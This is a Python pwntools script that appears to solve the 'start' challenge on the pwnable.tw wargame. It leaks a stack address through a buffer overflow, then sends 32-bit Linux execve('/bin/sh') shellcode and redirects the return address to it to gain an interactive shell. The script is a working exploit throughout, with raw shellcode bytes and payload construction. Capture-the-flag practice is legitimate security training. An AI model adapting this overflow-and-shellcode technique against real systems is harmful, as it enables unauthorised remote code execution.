#!/usr/bin/env python
# encoding: utf-8

from pwn import *

context.arch = 'i386'
context.os = 'linux'
context.log_level = 'debug'
context.terminal = 'zsh'

def main():
    # Io = process("./start")
    Io = remote("chall.pwnable.tw", 10000)

    Io.readuntil(":")

    # Leak stack address
    leak_stack = 0x08048087

    junk = "A" * 0x14
    payload = junk + p32(leak_stack)

    Io.send(payload)
    leak_data = Io.read()
    log.info("Leak data: %r" % (leak_data))
    esp_address = u32(leak_data[0:4])

    log.info("ESP: %08x" % (esp_address))

    shellcode_addr = esp_address + len(junk)
    log.info("Shellcode at: %08x" % (shellcode_addr))
    # Override saved return address to jump to esp then get shell
    # shellcode = asm(shellcraft.sh())
    # shellcode = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
    shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
    payload = junk + p32(shellcode_addr) + shellcode
    log.info("Payload: %s" % payload)

    Io.send(payload)

    Io.interactive()

    pass

if __name__ == "__main__":
    main()
